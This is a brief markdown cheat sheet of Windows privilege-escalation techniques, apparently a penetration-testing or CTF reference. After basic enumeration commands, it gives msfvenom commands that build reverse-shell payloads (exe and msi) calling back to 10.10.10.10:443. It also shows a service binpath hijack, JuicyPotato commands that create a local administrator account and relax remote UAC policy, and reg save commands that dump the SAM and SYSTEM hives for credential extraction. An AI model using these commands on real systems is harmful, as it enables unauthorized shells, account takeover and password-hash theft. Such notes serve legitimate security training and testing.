# Windows Privilege Escalation Techniques

## Windows Internal Enumeration

### System Enumeration

```powershell
systeminfo
windows version registry key print
.\winPease.exe
```

### Network Enumeration

```powershell
netstat -nat
```

### User Enumeration

```powershell

whoami /priv, whoami /all
net user <user>
```

## Group Enumeration

```powershell
net group
```

### Services Enumeration

```powershell
services
```

### Files Enumeration

```powershell
icacls file.txt
```

## Abusing groups

### Server Operators
Create/Modify Services

```powershell
# MSFVenom Reverse Shell (Specify x32/x64 bits)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe > rev.exe

# Modiying binary
sc.exe config VMTools binpath="C:\Users\Janrdz\Desktop\shell.exe"
```
## Abusing Privileges

### SeImpersonatePrivilege
#### [JuicyPotato](https://github.com/k4sth4/Juicy-Potato)

```powershell
JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user jan jan /add" -l 1337
JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators jan /add" -l 1337
JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
```

### AlwaysInstallElevated

Create a payload.msi with MSFVenom (Reverse Shell)

```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 --platform windows -a x64 -f msi -o reverse.msi
```

### SeBackupPrivilege

Create a copy of SYSTEM and SAM dump with [secretsdump.py](https://github.com/fin3ss3g0d/secretsdump.py)

```powershell
PS C:\Temp> reg save HKLM\system system
PS C:\Temp> reg save HKLM\sam sam
```
